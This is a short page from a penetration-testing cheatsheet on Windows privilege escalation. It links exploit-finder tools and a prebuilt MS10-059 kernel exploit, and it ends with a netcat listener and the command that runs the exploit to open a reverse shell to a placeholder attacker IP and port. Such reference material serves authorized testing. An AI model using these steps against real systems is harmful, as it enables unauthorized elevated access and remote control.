---
layout: default
parent: Windows
grand_parent: Pentest Cheatsheets
title: Windows Privilege Escalation
nav-order: 1
---

<details open markdown="block">
  <summary>
    Table of contents
  </summary>
  {: .text-delta }
1. TOC
{:toc}
</details>

**Exploit Finders**
===================

**PowerUp - PowerShellMafia**
-----------------------------
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

**Watson**
-----------------------------
https://github.com/rasta-mouse/Watson

**PowerLess - Pre-Powershell Checks**
-----------------------------
https://github.com/M4ximuss/Powerless

**Windows-Exploit-Suggester**
-----------------------------
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

**Exploits**
============

**MS10-059 | CVE-2010-2554 | CVE-2010-2555**
------------------
https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-059

https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe

```
nc -nlvp REVERSE_PORT
MS10-059.exe REVERSE_IP REVERSE_PORT
```
